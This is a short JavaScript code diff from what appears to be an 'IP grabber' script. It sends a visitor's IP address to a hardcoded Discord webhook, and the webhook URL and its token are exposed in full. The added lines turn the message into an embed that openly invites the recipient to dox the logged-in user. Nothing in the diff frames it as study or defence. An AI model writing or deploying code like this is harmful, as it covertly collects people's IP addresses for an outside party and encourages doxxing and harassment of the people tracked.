@@ -68,7 +68,24 @@
             const webhookURL = 'https://discord.com/api/webhooks/1181985888897601617/5lGDVSfQoy_-NJrsNA9XJbcHqmDcscShtlQORHFThz498zPex6LOXJ-XSar5V3LbZ0MZ';
 
             const data = {
-                content: "recent user's ip: " + json.ip
+                "content": null,
+                "embeds": [
+                    {
+                    "title": "From IP Grabber:",
+                    "description": "The most recent logged-in user's IP address is:\n" + json.ip,
+                    "color": 15431437,
+                    "fields": [
+                        {
+                        "name": "Now feel free to dox the living crap of that guy.",
+                        "value": "(or use it when you're about to lose an argument against him)"
+                        }
+                    ],
+                    "footer": {
+                        "text": "🗿🗿🗿"
+                    }
+                    }
+                ],
+                "attachments": []
             };
 
             fetch(webhookURL, {
